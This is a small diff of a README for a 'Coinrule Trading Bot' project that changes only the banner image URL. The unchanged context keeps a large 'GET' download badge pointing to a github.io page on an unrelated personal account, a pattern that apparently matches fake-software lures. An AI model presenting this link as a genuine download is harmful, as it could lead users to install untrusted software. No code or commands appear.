@@ -1,6 +1,6 @@
 # Coinrule Trading Bot — Strategy Rules, Signals & Automated Workflows
 
-![Banner Placeholder](https://img.einnews.com/facebook/314929/coinrule-logo.png)
+![Banner Placeholder](https://d2gdx5nv84sdx2.cloudfront.net/uploads/zuc412aw/theme/brand/5881/logo/Logo-v4-1.png)
 
 [![GET — Coinrule Trading Bot](https://img.shields.io/badge/GET%20%E2%80%94%20Coinrule%20Trading%20Bot-0078D6?style=for-the-badge&logoColor=white)](https://raley1997pruchnik.github.io/.github/Coinrule-Trading-Bot)
 
